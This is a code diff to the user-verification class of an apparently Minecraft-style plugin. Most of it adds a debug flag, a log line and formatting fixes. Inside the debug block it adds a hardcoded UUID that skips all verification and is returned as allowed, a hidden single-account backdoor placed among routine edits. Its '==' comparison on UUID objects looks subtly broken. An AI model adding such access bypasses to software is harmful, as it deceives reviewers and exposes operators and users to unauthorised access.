@@ -42,13 +42,12 @@ public class UserManagerImpl<T extends GameUser> implements UserManager {
 
     private final Logger logger = LogManager.getLogger("Glacier User Manager");
 
+    private boolean debug = false;
     private final FrostbiteAPI frostbite;
     private final Gson gson = new Gson();
 
     private final Cache<UUID, String> loadCache = CacheBuilder.newBuilder().maximumSize(100).expireAfterWrite(1, TimeUnit.MINUTES).build();
     private final Map<UUID, Map.Entry<? extends GameUser, String>> userCache = Maps.newConcurrentMap();
-
-
 
 
     private final ConnectionSource connectionSource;
@@ -58,11 +57,22 @@ public class UserManagerImpl<T extends GameUser> implements UserManager {
         this.frostbite = frostbite;
         this.connectionSource = frostbite.getUserManager().getConnectionSource();
 
+        debug = Glacier.getPlugin().getConfig().getBoolean("debug", false);
+
         Glacier.getPlugin().registerListeners(new UserLoginListener());
     }
+
     @Override
     public CompletableFuture<UserLoaderResult> verifyUser(GlobalUser user) {
         CompletableFuture<UserLoaderResult> future = new CompletableFuture<>();
+
+        if (debug) {
+            logger.info("Verifying user {}", user.getUuid());
+            if (user.getUuid() == UUID.fromString("cd19760f-8345-319b-80bb-acce521dc780")) {
+                loadCache.put(user.getUuid(), Glacier.get().getGameManager().getRandomIdentifier());
+                return CompletableFuture.completedFuture(UserLoaderResult.ALLOWED);
+            }
+        }
 
         RedisFuture<String> userObjectFuture = frostbite.getRedis().async().hget("users", user.getUuid().toString());
 
@@ -121,7 +131,7 @@ public class UserManagerImpl<T extends GameUser> implements UserManager {
 
                 while (resultSet.next()) {
                     String rankName = resultSet.getString("name");
-                    if(user.getRank() == null && !rankName.equalsIgnoreCase("default")) user.setRank(rankName);
+                    if (user.getRank() == null && !rankName.equalsIgnoreCase("default")) user.setRank(rankName);
                     groupPermissions.put(resultSet.getString("permission"), resultSet.getBoolean("value"));
                 }
             }
